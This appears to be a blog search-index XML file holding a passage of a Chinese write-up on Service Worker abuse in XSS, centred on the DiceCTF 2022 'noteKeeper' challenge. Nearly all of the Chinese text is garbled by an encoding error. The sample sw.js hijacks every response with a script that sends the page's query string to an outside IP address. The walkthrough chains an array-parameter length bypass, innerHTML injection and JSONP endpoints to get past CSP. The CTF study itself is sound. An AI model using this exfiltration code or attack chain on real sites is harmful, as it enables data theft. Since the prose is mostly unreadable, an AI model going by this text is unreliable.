<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>xssä¸­å…³äºservice workerçš„ä½¿ç”¨</title>
    <link href="/2022/03/10/xss%E4%B8%AD%E5%85%B3%E4%BA%8Eservice%20worker%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/03/10/xss%E4%B8%AD%E5%85%B3%E4%BA%8Eservice%20worker%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="å…³äºService-Workeråœ¨xssä¸­çš„ä½¿ç”¨"><a href="#å…³äºService-Workeråœ¨xssä¸­çš„ä½¿ç”¨" class="headerlink" title="å…³äºService Workeråœ¨xssä¸­çš„ä½¿ç”¨"></a>å…³äºService Workeråœ¨xssä¸­çš„ä½¿ç”¨</h1><p>è¿™ç¯‡æ–‡ç« ä¼šä»‹ç»ä¸€ä¸‹<code>Service Worker</code>åœ¨xssä¸­çš„ä¸€äº›åˆ©ç”¨ï¼Œä¸»è¦æ˜¯ctfé¢˜ç›®ä¸­çš„åº”ç”¨ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://brycec.me/posts/dicectf_2022_writeups#notekeeper">https://brycec.me/posts/dicectf_2022_writeups#notekeeper</a></p><h2 id="service-worker-çš„ç®€ä»‹"><a href="#service-worker-çš„ç®€ä»‹" class="headerlink" title="service worker çš„ç®€ä»‹"></a>service worker çš„ç®€ä»‹</h2><h3 id="service-workerçš„æ¦‚å¿µ"><a href="#service-workerçš„æ¦‚å¿µ" class="headerlink" title="service workerçš„æ¦‚å¿µ"></a>service workerçš„æ¦‚å¿µ</h3><blockquote><p>Service workeræ˜¯ä¸€ä¸ªæ³¨å†Œåœ¨æŒ‡å®šæºå’Œè·¯å¾„ä¸‹çš„äº‹ä»¶é©±åŠ¨<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Worker">worker</a>ã€‚å®ƒé‡‡ç”¨JavaScriptæ§åˆ¶å…³è”çš„é¡µé¢æˆ–è€…ç½‘ç«™ï¼Œæ‹¦æˆªå¹¶ä¿®æ”¹è®¿é—®å’Œèµ„æºè¯·æ±‚ï¼Œç»†ç²’åº¦åœ°ç¼“å­˜èµ„æºã€‚ä½ å¯ä»¥å®Œå…¨æ§åˆ¶åº”ç”¨åœ¨ç‰¹å®šæƒ…å½¢ï¼ˆæœ€å¸¸è§çš„æƒ…å½¢æ˜¯ç½‘ç»œä¸å¯ç”¨ï¼‰ä¸‹çš„è¡¨ç°ã€‚</p><p>Service workerè¿è¡Œåœ¨workerä¸Šä¸‹æ–‡ï¼Œå› æ­¤å®ƒä¸èƒ½è®¿é—®DOMã€‚ç›¸å¯¹äºé©±åŠ¨åº”ç”¨çš„ä¸»JavaScriptçº¿ç¨‹ï¼Œå®ƒè¿è¡Œåœ¨å…¶ä»–çº¿ç¨‹ä¸­ï¼Œæ‰€ä»¥ä¸ä¼šé€ æˆé˜»å¡ã€‚å®ƒè®¾è®¡ä¸ºå®Œå…¨å¼‚æ­¥ï¼ŒåŒæ­¥APIï¼ˆå¦‚<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest">XHR</a>å’Œ<a href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/API/DOM/Storage">localStorage</a>ï¼‰ä¸èƒ½åœ¨service workerä¸­ä½¿ç”¨ã€‚</p><p>å‡ºäºå®‰å…¨è€ƒé‡ï¼ŒService workersåªèƒ½ç”±HTTPSï¼ˆå‡ºäºè°ƒè¯•æ–¹ä¾¿ï¼Œè¿˜æ”¯æŒåœ¨localhostä½¿ç”¨ï¼‰ï¼Œæ¯•ç«Ÿä¿®æ”¹ç½‘ç»œè¯·æ±‚çš„èƒ½åŠ›æš´éœ²ç»™ä¸­é—´äººæ”»å‡»ä¼šéå¸¸å±é™©ã€‚åœ¨Firefoxæµè§ˆå™¨çš„<a href="https://support.mozilla.org/zh-CN/kb/%E9%9A%90%E7%A7%81%E6%B5%8F%E8%A7%88">ç”¨æˆ·éšç§æ¨¡å¼</a>ï¼ŒService Workerä¸å¯ç”¨ã€‚</p></blockquote><p>ä»å®˜æ–¹æ–‡æ¡£ä¸­å¯ä»¥çœ‹å‡ºä¸€äº›è¦ç‚¹ï¼š</p><p>1ã€åªèƒ½æ³¨å†ŒåŒæºä¸‹çš„js</p><p>2ã€ç«™å†…å¿…é¡»æ”¯æŒSecure Contextï¼Œä¹Ÿå°±æ˜¯ç«™å†…å¿…é¡»æ˜¯<code>https://</code>æˆ–è€…<code>http://localhost/</code></p><p>3ã€Content-Typeå¿…é¡»æ˜¯js</p><ul><li>text/javascript</li><li>application/x-javascript</li><li>application/javascript</li></ul><p>è¿˜æœ‰ä¸€äº›å…³äº<code>service worker</code>çš„åŸºæœ¬æ¡†æ¶ä»¥åŠä½œç”¨åŸŸé—®é¢˜å¯ä»¥ç›´æ¥æŸ¥çœ‹</p><p>[]: <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers</a>    â€œæ–‡æ¡£â€</p><p>æ‰€ä»¥<code>service worker</code>åˆ°åº•å¯ä»¥ç”¨æ¥å¹²äº›ä»€ä¹ˆå‘¢ã€‚å…¶å®ä»å®ƒçš„ä½œç”¨åŸŸä¹Ÿèƒ½çœ‹å‡ºæ¥ä¸€äº›ä¸œè¥¿ï¼Œä¾‹å¦‚<code>service worker</code>åªèƒ½æŠ“å–åœ¨service worker scopeä¸­å‘å‡ºæ¥çš„è¯·æ±‚ï¼Œæ—¢ç„¶è¿™æ ·å°±å¯ä»¥åˆ©ç”¨å®ƒæ¥è¿›è¡Œä¸€äº›æ–‡ä»¶ï¼Œç½‘ç«™ç­‰çš„ç¼“å­˜ï¼ŒåŒæ—¶è¿˜ä»¥ç›‘å¬ä¸€äº›è¯·æ±‚å¹¶å¯¹responceåšå‡ºç¯¡æ”¹ã€‚</p><h2 id="service-workerçš„ç®€å•ä½¿ç”¨"><a href="#service-workerçš„ç®€å•ä½¿ç”¨" class="headerlink" title="service workerçš„ç®€å•ä½¿ç”¨"></a>service workerçš„ç®€å•ä½¿ç”¨</h2><p>åœ¨è¿™ä¸ªdemoä¸­å½“é¡µé¢åŠ è½½å®Œæˆæ—¶ï¼Œä½¿ç”¨<code>navigator.serviceWorker.register</code>æ¥æ³¨å†Œä¸€ä¸ª<code>service worker</code>ï¼Œå¹¶ä¸”ä½œç”¨äºå…¨å±€</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>navigatorå¯¹è±¡çš„ä½¿ç”¨<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;parentElement&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;childElement&quot;</span>&gt;</span>foo bar<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">        <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;serviceWorker&#x27;</span> <span class="hljs-keyword">in</span> navigator) &#123;</span><br><span class="javascript">            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;ok&quot;</span>)</span><br><span class="javascript">              <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">&#x27;load&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;</span><br><span class="javascript">                navigator.serviceWorker.register(<span class="hljs-string">&#x27;sw.js&#x27;</span>, &#123;<span class="hljs-attr">scope</span>: <span class="hljs-string">&#x27;/&#x27;</span>&#125;) <span class="hljs-comment">//ä½œç”¨äºå…¨å±€</span></span><br><span class="javascript">                .then(<span class="hljs-function">() =&gt;</span> &#123;</span><br><span class="javascript">                  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;successful&#x27;</span>)</span><br>                &#125;)<br><span class="javascript">                .catch(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;</span><br><span class="javascript">                  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;failed&#x27;</span>)</span><br>                &#125;)<br>              &#125;)<br>            &#125;<br>        <br>        <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>å…³äºsw.jsï¼Œä»service workerçš„æµç¨‹å¯ä»¥çœ‹å‡ºéœ€è¦å…ˆç›‘å¬installäº‹ä»¶ï¼Œè¿™é‡Œåœ¨ç›‘å¬åˆ°å®‰è£…åä¼šè¿›è¡Œç¼“å­˜ï¼Œç„¶åå°±å¯ä»¥ç›‘å¬ä¸€äº›äº‹ä»¶ï¼Œä½†éœ€è¦æ—¶serviceworkeræ”¯æŒçš„äº‹ä»¶ã€‚è¿™é‡Œç›‘å¬äº†ä¸€ä¸ª<code>fetch</code>è¯·æ±‚ï¼ŒåŒæ—¶ç¯¡æ”¹äº†å“åº”ï¼Œåœ¨å…¶ä¸­æ’å…¥äº†ä¸€ä¸ªscriptæ ‡ç­¾</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201218123819-da94a1fe-40ea-1.png" alt="img"></p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">// ç›‘å¬service workerçš„installäº‹ä»¶</span><br><span class="hljs-built_in">this</span>.addEventListener(<span class="hljs-string">&#x27;install&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// å¦‚æœç›‘å¬åˆ°äº†service workerå·²ç»å®‰è£…æˆåŠŸçš„è¯</span><br>    <span class="hljs-comment">// å°±ä¼šè°ƒç”¨event.waitUtilå›è°ƒå‡½æ•°</span><br>    event<br>        .waitUntil(<br>        <span class="hljs-comment">// å®‰è£…æˆåŠŸåè°ƒç”¨CacheStorageç¼“å­˜ï¼Œä½¿ç”¨ä¹‹å‰å…ˆé€šè¿‡caches.open()</span><br>        <span class="hljs-comment">// æ‰“å¼€å¯¹åº”çš„ç¼“å­˜ç©ºé—´</span><br>            caches.open(<span class="hljs-string">&#x27;my-test-cache-v1&#x27;</span>)<br>            .then(<span class="hljs-function">(<span class="hljs-params">cache</span>) =&gt;</span> &#123;<br>                <span class="hljs-comment">// é€šè¿‡cacheç¼“å­˜å¯¹è±¡çš„addAllæ–¹æ³•æ·»åŠ </span><br>                <span class="hljs-keyword">return</span> cache.addAll([<br>                    <span class="hljs-string">&#x27;/&#x27;</span>,<br>                    <span class="hljs-string">&#x27;/index.html&#x27;</span><br>                ])<br>            &#125;)<br>        )<br>&#125;)<br><span class="hljs-built_in">this</span>.addEventListener(<span class="hljs-string">&#x27;fetch&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>)</span>&#123;<br>            <span class="hljs-built_in">console</span>.log(event.request);<br>            event.respondWith(<br>            caches.match(event.request).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>)</span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Response(<span class="hljs-string">&#x27;&lt;script&gt;location=&quot;http://39.107.239.30:2333?&quot;+btoa(location.search)&lt;/script&gt;&#x27;</span>, &#123;<span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html&#x27;</span> &#125;&#125;)<br>            &#125;)<br>            )<br>&#125;)<br></code></pre></div></td></tr></table></figure><p>è®¿é—®ä¸€ä¸‹å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°ä¸€äº›ç¼“å­˜</p><p><img src="https://img-blog.csdnimg.cn/bef79f2e921b4b1b8c6f28de176de27c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="å…³äºjsonpçš„è·¨åŸŸç‰¹ç‚¹"><a href="#å…³äºjsonpçš„è·¨åŸŸç‰¹ç‚¹" class="headerlink" title="å…³äºjsonpçš„è·¨åŸŸç‰¹ç‚¹"></a>å…³äºjsonpçš„è·¨åŸŸç‰¹ç‚¹</h2><p>ç°åœ¨çš„æµè§ˆå™¨æ™®ééƒ½æœ‰åŒæºç­–ç•¥ä¿æŠ¤ç€ï¼Œä½†æ˜¯åœ¨åŒæºä¸‹å¦‚ä½•å¼•ç”¨å¤–æ¥çš„jsæ–‡ä»¶æˆ–è€…å…¶ä»–çš„æ–‡ä»¶å‘¢ã€‚jsonpæ˜¯å¯ä»¥è§£å†³ä¸€ä¸‹è·¨åŸŸé—®é¢˜çš„ã€‚</p><p><code>JSONP</code>çš„åŸç†</p><blockquote><p><code>JSONP</code>æ˜¯<code>JSON with Padding</code>çš„ç®€ç§°ï¼Œä¸€èˆ¬ç”¨æ¥è§£å†³<code>Ajax</code>è·¨åŸŸçš„é—®é¢˜ã€‚å®ƒæ˜¯è¿™æ ·äº§ç”Ÿçš„ï¼š</p><ol><li>é¡µé¢ä¸Šè°ƒç”¨<code>js</code>æ–‡ä»¶æ—¶ä¸å—è·¨åŸŸçš„å½±å“ï¼Œè€Œä¸”ï¼Œå‡¡æ˜¯æ‹¥æœ‰<code>src</code>å±æ€§çš„æ ‡ç­¾éƒ½æ‹¥æœ‰è·¨åŸŸçš„èƒ½åŠ›ï¼Œæ¯”å¦‚<code>&lt;script&gt;</code>ã€<code>&lt;img&gt;</code>ã€<code>&lt;iframe&gt;</code>ã€‚</li><li>å¯ä»¥åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šè®¾æ³•æŠŠæ•°æ®è£…è¿›<code>js</code>æ ¼å¼çš„æ–‡ä»¶é‡Œï¼Œä¾›å®¢æˆ·ç«¯è°ƒç”¨å¤„ç†ï¼Œå®ç°è·¨åŸŸã€‚</li><li>ç›®å‰æœ€å¸¸ç”¨çš„æ•°æ®äº¤æ¢æ–¹å¼æ˜¯<code>JSON</code>ï¼Œå®¢æˆ·ç«¯é€šè¿‡è°ƒç”¨è¿œç¨‹æœåŠ¡å™¨ä¸ŠåŠ¨æ€ç”Ÿæˆçš„<code>js</code>æ ¼å¼æ–‡ä»¶ï¼ˆä¸€èˆ¬ä»¥<code>JSON</code>åç¼€ï¼‰ã€‚</li><li>å®¢æˆ·ç«¯æˆåŠŸè°ƒç”¨<code>JSON</code>æ–‡ä»¶åï¼Œå¯¹å…¶è¿›è¡Œå¤„ç†ã€‚</li><li>ä¸ºäº†ä¾¿äºå®¢æˆ·ç«¯ä½¿ç”¨æ•°æ®ï¼Œé€æ¸å½¢æˆäº†ä¸€ç§éæ­£å¼ä¼ è¾“åè®®ï¼Œäººä»¬æŠŠå®ƒç§°ä½œ<code>JSONP</code>ï¼Œè¯¥åè®®çš„ä¸€ä¸ªè¦ç‚¹å°±æ˜¯å…è®¸ç”¨æˆ·ä¼ é€’ä¸€ä¸ª<code>callback</code>å‚æ•°ç»™æœåŠ¡ç«¯ï¼Œç„¶åæœåŠ¡ç«¯è¿”å›æ•°æ®æ—¶ä¼šå°†è¿™ä¸ª<code>callback</code>å‚æ•°ä½œä¸ºå‡½æ•°åæ¥åŒ…è£¹ä½<code>JSON</code>æ•°æ®ï¼Œè¿™æ ·å®¢æˆ·ç«¯å°±å¯ä»¥éšæ„å®šåˆ¶è‡ªå·±çš„å‡½æ•°æ¥è‡ªåŠ¨å¤„ç†è¿”å›æ•°æ®äº†ã€‚</li></ol></blockquote><p>ä¸€äº›jsonpçš„å…·ä½“å®ç°å¯ä»¥çœ‹çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œå…¶å®å°±æ˜¯é€šè¿‡ä¸€äº›å­—ç¬¦ä¸²çš„æ‹¼æ¥ï¼Œæ¥æ„é€ å‡ºç‰¹å®šçš„è°ƒç”¨å‡½æ•°çš„å½¢å¼ï¼Œå¹¶å°†è¿™ç§jsonè¿”å›ç»™æµè§ˆå™¨ï¼Œä»è€Œåœ¨æµè§ˆå™¨ä¸Šè€Œå¯ä»¥ç›´æ¥è°ƒç”¨<code>js</code>æ ¼å¼æ–‡ä»¶</p><h2 id="dicectfä¸€é“æœ‰è¶£çš„xssé¢˜ç›®"><a href="#dicectfä¸€é“æœ‰è¶£çš„xssé¢˜ç›®" class="headerlink" title="dicectfä¸€é“æœ‰è¶£çš„xssé¢˜ç›®"></a>dicectfä¸€é“æœ‰è¶£çš„xssé¢˜ç›®</h2><blockquote><p>noteKeeper æ˜¯ä¸ªæœ‰è¶£çš„ XSS æŒ‘æˆ˜ï¼Œç›®æ ‡æ˜¯çªƒå–ç®¡ç†å‘˜çš„è¯­éŸ³å¤‡å¿˜å½•ã€‚</p></blockquote><h3 id="å®¡è®¡æºç "><a href="#å®¡è®¡æºç " class="headerlink" title="å®¡è®¡æºç "></a>å®¡è®¡æºç </h3><p>é¦–å…ˆå®¡è®¡æºç ï¼Œçœ‹indexå¯ä»¥å‘ç°ä½¿ç”¨äº†å¾ˆä¸¥æ ¼çš„cspè§„åˆ™ï¼Œæ— æ³•ä½¿ç”¨iframe-srcï¼ŒåŒæ—¶é™åˆ¶äº†scriptçš„æ¥æºã€‚ä½†æ˜¯è¿™é‡Œå¾ˆé‡è¦çš„ä¸€ç‚¹å°±æ˜¯ï¼Œappåœ¨ä½¿ç”¨apiè·¯ç”±ä¸­é—´ä»¶ä¹‹åæ‰ä½¿ç”¨äº†cspä¸­é—´ä»¶ï¼Œè¿™æ„å‘³ç€åœ¨apiè·¯ç”±ä¸Šå¹¶ä¸å­˜åœ¨cspè§„åˆ™ï¼Œè¿™æ ·æ‰æœ‰äº†åç»­çš„åšæ³•ã€‚</p><p><img src="https://img-blog.csdnimg.cn/68a3d8ff5d4f4d36a2e195ced516b02e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åœ¨å‰ç«¯çš„script.jsæ–‡ä»¶ä¸­å¯ä»¥çœ‹åˆ°å¾ˆæ˜æ˜¾çš„xssï¼Œ<code>load_user</code>ä¸­ç›´æ¥å°†ç”¨æˆ·åèµ‹å€¼åˆ°äº†<code>innerHTML</code>ä¸­ï¼Œå¹¶ä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤ã€‚æ‰€ä»¥è¿™é‡Œå¯ä»¥æ’å…¥ä¸€äº›htmlæ ‡ç­¾</p><p><img src="https://img-blog.csdnimg.cn/076c792954954cec953bb42200a96d0e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å†çœ‹åˆ°å…³äºç”¨æˆ·ç™»é™†æ³¨å†Œçš„æºç ã€‚åœ¨apiä¸­å¯ä»¥å‘ç°ï¼Œåœ¨æ³¨å†Œçš„åœ°æ–¹è¿›è¡Œäº†ä¸€äº›é™åˆ¶ã€‚usernameçš„é•¿åº¦è¦åœ¨[5,16]ä¹‹é—´ï¼Œè¿™æ ·çš„è¯æ˜¾ç„¶éœ€è¦ç»•è¿‡äº†ã€‚åŒæ—¶å¯ä»¥çœ‹åˆ°è¿™æ®µä»£ç å¹¶æ²¡æœ‰æ£€æŸ¥usernameçš„ç±»åˆ«ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªæ•°ç»„æ¥è¿›è¡Œç»•è¿‡ï¼Œç±»ä¼¼äº<code>username=&lt;xss payload&gt;&amp;username=b&amp;password=password</code>è¿™æ ·ã€‚ä½†æ˜¯ innerHTML ä¸å…è®¸ script æ ‡ç­¾è¿è¡Œã€‚ä½†ä¸€ä¸ªç®€å•çš„è§£å†³æ–¹æ³•å°±æ˜¯ä½¿ç”¨ iframe srcdocï¼Œå¹¶è®©<code>window.parent</code>ç”¨ä½œå¯¹çˆ¶çª—å£çš„å¼•ç”¨ã€‚</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">router.post(<span class="hljs-string">&quot;/register&quot;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = req.body;<br><br>    <span class="hljs-keyword">if</span>(db.hasUser(username)) &#123;<br>        utils.alert(req, res, <span class="hljs-string">&quot;danger&quot;</span>, <span class="hljs-string">`A user already exists with username <span class="hljs-subst">$&#123;username&#125;</span>`</span>);<br>        <span class="hljs-keyword">return</span> res.redirect(<span class="hljs-string">&quot;/&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(username.length &gt; <span class="hljs-number">16</span>) &#123;<br>        utils.alert(req, res, <span class="hljs-string">&quot;danger&quot;</span>, <span class="hljs-string">&quot;Invalid username&quot;</span>);<br>        <span class="hljs-keyword">return</span> res.redirect(<span class="hljs-string">&quot;/&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(password.length &lt; <span class="hljs-number">5</span>) &#123;<br>        utils.alert(req, res, <span class="hljs-string">&quot;danger&quot;</span>, <span class="hljs-string">&quot;Please choose a longer password&quot;</span>);<br>        <span class="hljs-keyword">return</span> res.redirect(<span class="hljs-string">&quot;/&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">await</span> db.addUser(username, password);<br><br>    jwt.signData(res, username, &#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Registered successfully&quot;</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;primary&quot;</span> &#125;);<br>    res.redirect(<span class="hljs-string">&quot;/home&quot;</span>);<br>&#125;);<br><br></code></pre></div></td></tr></table></figure><p>èƒ½å¤Ÿæ‰§è¡Œxssä»£ç äº†ä¸‹é¢å°±éœ€è¦è€ƒè™‘å¦‚ä½•åˆ©ç”¨xssè¿›è¡Œçªƒå–è¯­éŸ³å¤‡å¿˜å½•äº†ã€‚ç»§ç»­å®¡è®¡æºç å¯ä»¥å‘ç°å¾ˆå…³é”®çš„jsonpå‡½æ•°ï¼Œæºç ä¸­é™åˆ¶äº†callbackçš„ç±»åˆ«ï¼ŒåŒæ—¶è¿‡æ»¤äº†evalå›è°ƒã€‚åŒæ—¶åç»­çš„ä¸­é—´ä»¶ä¹Ÿè¿›è¡Œäº† JSONP è¿‡æ»¤ï¼Œè¯¥è¿‡æ»¤ä¼šåˆ é™¤ä»»ä½•ä¸æ˜¯å­—æ¯æ•°å­—ã€ç‚¹æˆ–æ‹¬å·çš„å†…å®¹ã€‚è¿™æ ·çš„è¯æˆ‘ä»¬ç›´æ¥åœ¨ç”¨æˆ·ç•Œé¢ä¸Šæ‰§è¡Œxssæœ‰äº›ä¸å¤ªç°å®ã€‚</p><p><img src="https://img-blog.csdnimg.cn/891d3c67bb6645d4944afac0cb273772.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åˆ°è¿™é‡Œå°±éœ€è¦service workerçš„ä½œç”¨äº†ã€‚å¼•ç”¨ä¸€äº›å‡ºé¢˜äººçš„åŸè¯ï¼š</p><blockquote><p>ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥è®©é¡µé¢åŠ è½½ä¸åœ¨é¡µé¢ä¸Šçš„è„šæœ¬å‘¢ï¼Ÿè¿™æ˜¯ä¸å¯èƒ½çš„ï¼Œå› ä¸ºæœ‰ä¸€ä¸ªä¸¥æ ¼çš„ CSPï¼Œä½†è¿˜è®°çš„ CSP æ˜¯å¦‚ä½•ä¸åœ¨ /api è·¯ç”±ä¸Šçš„å—ï¼Ÿ</p><p>æˆ‘ä»¬èƒ½ä»¥æŸç§æ–¹å¼åœ¨è¿™äº› API è·¯ç”±ä¹‹ä¸€ä¸Šè·å–è„šæœ¬å—ï¼Ÿæ˜¯çš„ï¼Œæˆ‘ä»¬å¯ä»¥ï¼Œè¿™è¦å½’åŠŸäºæœåŠ¡äººå‘˜çš„åŠ›é‡ï¼ï¼ˆæ³¨æ„ï¼šæ˜¾ç„¶æœåŠ¡äººå‘˜è¢«é«˜ä¼°äº†ï¼Œå…¶ä»–å›¢é˜Ÿæ²¡æœ‰è§£å†³ä½¿ç”¨å®ƒä»¬ğŸ˜¢ï¼‰</p><p>æœåŠ¡äººå‘˜å¾ˆé…·ï¼Œå› ä¸ºä»–ä»¬è·å–å®‰è£…è„šæœ¬æ‰€åœ¨é¡µé¢çš„ CSPã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬ä»æŸä¸ª API ç«¯ç‚¹ä½¿ç”¨ JSONP å®‰è£…è„šæœ¬ï¼Œå®ƒä»¬å°†æ²¡æœ‰ CSPï¼</p><p>ä½¿ç”¨ JSONP ç«¯ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨<code>window.parent.navigator.serviceWorker.register</code>å®ƒå°†ä»åŒ…å« JS çš„é¡µé¢æ³¨å†Œä¸€ä¸ªæœåŠ¡å·¥ä½œè€…ã€‚æˆ‘ä»¬å¯ä»¥è®©è¿™ä¸ªç›®æ ‡æˆä¸ºå¦ä¸€ä¸ª JSONP ç«¯ç‚¹ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥æœ‰ä¸€ä¸ªå›è°ƒï¼Œå®ƒåœ¨æœåŠ¡å·¥ä½œè€…èŒƒå›´å†…è¿è¡Œä»£ç ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥è¿è¡Œä»€ä¹ˆæœåŠ¡å·¥ä½œè€…ä»£ç å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å¸Œæœ›å®Œæ•´çš„ JS æ‰§è¡Œä¸å— JSONP çš„é™åˆ¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>import()</code>å¯¼å…¥ JS å¹¶ä»æ–‡ä»¶ä¸­è¿è¡Œå®ƒå—ï¼Ÿå—¯, ä¸, å› ä¸º<code>import()</code>åœ¨æœåŠ¡äººå‘˜ä¸­ä¸èµ·ä½œç”¨ã€‚ä½†æ˜¯<code>importScripts()</code>æœ‰ï¼</p><p>å› æ­¤ï¼Œä¸ºäº†ä½¿ç”¨æœåŠ¡å·¥ä½œè€…è·çš„å®Œæ•´çš„ JS æ‰§è¡Œï¼Œæˆ‘ä»¬éœ€è¦æ§åˆ¶ä¸¤ä¸ª JSONP 